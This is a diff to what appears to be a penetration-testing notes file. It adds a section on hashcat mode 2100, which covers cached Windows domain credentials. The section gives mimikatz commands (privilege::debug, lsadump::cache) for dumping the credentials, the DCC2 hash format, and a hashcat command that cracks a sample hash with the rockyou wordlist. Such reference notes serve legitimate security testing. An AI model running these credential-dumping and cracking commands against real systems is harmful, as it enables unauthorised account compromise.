@@ -207,6 +207,28 @@ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.crack
 ```
 
 
+### Module 2100: mscache, Cached Domain Credentials
+
+They can be obtained, for instance from mimikatz:
+
+```
+.\mimikatz.exe
+
+privilege::debug
+lsadump::cache
+```
+
+To crack mscache with hashcat, it should be in the following format:
+
+```
+$DCC2$10240#username#hash
+```
+
+```
+hashcat -m2100 '$DCC2$10240#spot#3407de6ff2f044ab21711a394d85f3b8' /usr/share/wordlists/rockyou.txt --force --potfile-disable
+```
+
+
 ### Module 5600: netNTLMv2
 
 All saved Hashes are located in [Responder](responder.md)'s logs directory (/usr/share/responder/logs/). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.
